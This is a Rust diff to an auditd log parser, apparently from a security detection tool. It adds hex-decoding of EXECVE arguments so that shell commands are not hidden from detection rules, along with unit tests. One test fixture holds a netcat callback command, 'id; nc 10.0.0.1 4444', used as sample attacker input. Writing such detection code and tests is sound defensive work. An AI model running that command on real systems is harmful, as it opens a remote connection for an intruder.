@@ -72,12 +72,44 @@ pub fn parse_execve_argv(record: &AuditRecord) -> Vec<String> {
         // remaining digits.
         if let Some(idx_str) = k.strip_prefix('a') {
             if let Ok(idx) = idx_str.parse::<usize>() {
-                indexed.push((idx, v.clone()));
+                let arg = maybe_decode_auditd_hex(v).unwrap_or_else(|| v.clone());
+                indexed.push((idx, arg));
             }
         }
     }
     indexed.sort_by_key(|(i, _)| *i);
     indexed.into_iter().map(|(_, v)| v).collect()
+}
+
+/// Decode an auditd hex-encoded EXECVE arg, or `None` if `v` is not one.
+///
+/// auditd emits an arg UNQUOTED as a hex string exactly when the value needs
+/// encoding — libaudit's `audit_value_needs_encoding` triggers on a `"`, any
+/// byte `< 0x21` (space/control), or any byte `> 0x7e` (non-ASCII). So an
+/// all-hex token whose decoded bytes contain such a character is genuinely
+/// hex-encoded; one that decodes to clean printable ASCII is a value auditd
+/// would have QUOTED instead, i.e. a literal arg that merely looks hex — those
+/// are left untouched. Decoding closes a telemetry-evasion gap: a command with
+/// a space or shell metacharacter would otherwise reach detection as an opaque
+/// blob.
+fn maybe_decode_auditd_hex(v: &str) -> Option<String> {
+    let b = v.as_bytes();
+    if b.len() < 2 || b.len() % 2 != 0 || !b.iter().all(u8::is_ascii_hexdigit) {
+        return None;
+    }
+    let mut decoded = Vec::with_capacity(b.len() / 2);
+    let mut i = 0;
+    while i < b.len() {
+        let hi = (b[i] as char).to_digit(16)?;
+        let lo = (b[i + 1] as char).to_digit(16)?;
+        decoded.push((hi * 16 + lo) as u8);
+        i += 2;
+    }
+    // Only treat it as encoded if auditd would actually have encoded it.
+    if !decoded.iter().any(|&c| c == b'"' || !(0x21..=0x7e).contains(&c)) {
+        return None;
+    }
+    String::from_utf8(decoded).ok()
 }
 
 /// Parse one audit log line. Returns `None` for lines that don't look like
@@ -331,6 +363,34 @@ mod tests {
         let r = parse_line(line).unwrap();
         let argv = parse_execve_argv(&r);
         assert_eq!(argv, vec!["ls", "-la", "/tmp"]);
+    }
+
+    #[test]
+    fn parses_execve_argv_hex_decodes_special_char_args() {
+        // auditd hex-encodes (UNQUOTED) any EXECVE arg containing a space,
+        // control char, double-quote, or non-ASCII byte. Without decoding, a
+        // command like `sh -c "id; nc 10.0.0.1 4444"` reaches the event as an
+        // opaque hex blob and evades every detection rule that keys on the
+        // command text — a real telemetry-evasion gap.
+        let payload = "id; nc 10.0.0.1 4444";
+        let hexed: String = payload.bytes().map(|b| format!("{b:02x}")).collect();
+        let line = format!(
+            r#"type=EXECVE msg=audit(1736944800.000:42): argc=3 a0="sh" a1="-c" a2={hexed}"#
+        );
+        let r = parse_line(&line).unwrap();
+        let argv = parse_execve_argv(&r);
+        assert_eq!(argv, vec!["sh", "-c", "id; nc 10.0.0.1 4444"]);
+    }
+
+    #[test]
+    fn parse_execve_argv_leaves_literal_hexlike_arg_untouched() {
+        // A quoted literal arg that happens to be all hex but decodes to plain
+        // text (no space/control/quote/non-ASCII) is one auditd would have
+        // QUOTED, not encoded — so it must NOT be decoded. `6162` -> "ab" is
+        // clean, so the literal token is preserved.
+        let line = r#"type=EXECVE msg=audit(1.0:1): argc=1 a0="6162""#;
+        let r = parse_line(line).unwrap();
+        assert_eq!(parse_execve_argv(&r), vec!["6162"]);
     }
 
     #[test]
